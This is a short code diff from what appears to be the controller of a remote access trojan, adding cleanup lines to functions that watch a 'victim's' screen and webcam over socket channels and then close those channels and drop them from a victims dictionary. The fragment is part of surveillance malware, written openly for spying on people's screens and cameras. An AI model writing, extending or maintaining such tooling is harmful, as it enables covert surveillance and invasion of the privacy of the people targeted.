@@ -180,6 +180,11 @@ def handleScreenSharing(selectedVictim):
 
     scWatcher.watchScreen(victims[selectedVictim][SCREEN_SHARE_CHANNEL])
 
+    # Closes the connection
+    victims[selectedVictim][SCREEN_SHARE_CHANNEL].close()
+    # Removes from the victims dictionary
+    victims[selectedVictim].pop(SCREEN_SHARE_CHANNEL) 
+
 def handleWebCameraSharing(selectedVictim):
     """
     Executes the web camera sharing command
@@ -194,6 +199,11 @@ def handleWebCameraSharing(selectedVictim):
         sleep(1)
 
     wcWatcher.watchWebCam(victims[selectedVictim][WEB_CAM_SHARE_CHANNEL])
+
+    # Closes the connection
+    victims[selectedVictim][WEB_CAM_SHARE_CHANNEL].close()
+    # Removes from the victims dictionary
+    victims[selectedVictim].pop(WEB_CAM_SHARE_CHANNEL) 
 
 
 def sendCommand(command, victimSoc):
